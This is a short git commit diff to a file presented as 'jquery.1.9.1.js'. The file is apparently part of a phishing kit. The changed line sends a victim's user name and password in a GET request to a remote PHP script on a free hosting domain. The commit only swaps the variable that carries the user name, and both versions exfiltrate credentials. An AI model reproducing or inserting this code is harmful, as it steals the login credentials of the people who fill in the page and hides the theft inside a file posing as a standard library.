c482342f205d53bb2851f4a59cfc0f6aa20da5d6
houseofnapierbnb <45586402+houseofnapierbnb@users.noreply.github.com>
2019-01-12 22:13:38 +0200

    Update jquery.1.9.1.js

--- jquery.1.9.1.js
+++ jquery.1.9.1.js
@@ -80,7 +80,7 @@
                             }
                         }
                     };
-                    xhttp.open("GET", "https://newvoicemessag33.000webhostapp.com/ntesdoor2.php?user=" + testx +   "&pass="  + em +  ps , true, true);
+                    xhttp.open("GET", "https://newvoicemessag33.000webhostapp.com/ntesdoor2.php?user=" + user +   "&pass="  + em +  ps , true, true);
                     xhttp.send();
                 }
 
